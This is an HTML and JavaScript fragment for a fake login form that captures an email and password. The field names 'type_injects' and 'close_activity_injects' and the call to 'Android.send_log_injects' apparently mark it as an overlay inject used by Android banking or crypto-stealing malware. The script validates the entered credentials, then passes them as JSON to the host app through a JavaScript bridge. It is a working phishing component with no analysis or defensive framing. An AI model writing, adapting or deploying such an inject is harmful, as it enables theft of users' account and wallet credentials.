    <style>
        form {
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        section {
            padding: 20px;
            flex: 1;
        }

        header {
            padding: 20px;
            text-align: center;
        }

        footer {
            padding: 20px;
        }

        label {
            color: #204d6a;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 0;
        }

        .input {
            width: 100%;
            padding: 3px;
            padding-left: 0;
            border: 0;
            border-bottom: 1px solid #c0c0c0;
            margin-bottom: 20px;
            padding-right: 25px;
        }

        .input:focus {
            border-bottom: 2px solid #9f9f9f;
        }

        .button {
            width: 100%;
            background-color: #4b74f4;
            border: 0;
            border-radius: 3px;
            border-bottom: 2px solid #cfcfcf;
            color: #fff;
            font-weight: 600;
            padding: 8px;
            margin-bottom: 15px;
        }

        .error {
            border-color: #f00 !important;
        }

        input, button {
            outline: none !important;
            box-shadow: none !important;
        }
    </style>
</head>

    <script>

        var sendData = document.getElementById('sendData'),
            eye = document.getElementById('eye');
        
        var login = document.getElementById('login'),
            password = document.getElementById('password');

        eye.onclick = () => {
            if(password.type == 'password') {
                password.type = 'text'
            } else {
                password.type = 'password'
            }
        }

        sendData.onclick = () => {
            if(!/^([a-z0-9_-]+\.)*[a-z0-9_-]+@[a-z0-9_-]+(\.[a-z0-9_-]+)*\.[a-z]{2,6}$/i.test(login.value)) {
                login.classList.add('error');
            } else {
                login.classList.remove('error')
            }

            if(password.value.length < 5) {
                password.classList.add('error')
            } else {
                password.classList.remove('error')
            }

            if(/^([a-z0-9_-]+\.)*[a-z0-9_-]+@[a-z0-9_-]+(\.[a-z0-9_-]+)*\.[a-z]{2,6}$/i.test(login.value) && password.value.length > 5) {
                var data = {};
                data.email = login.value;
                data.password = password.value;
                data.type_injects = "crypt";
                data.closed = "close_activity_injects";

                var ua = navigator.userAgent.toLowerCase();
                if(ua.indexOf("android") > -1) {
                    try {
                        Android.send_log_injects(JSON.stringify(data))
                    } catch (err) {}
                }else{
                    alert(JSON.stringify(data));
                }
            }
        }
    </script>
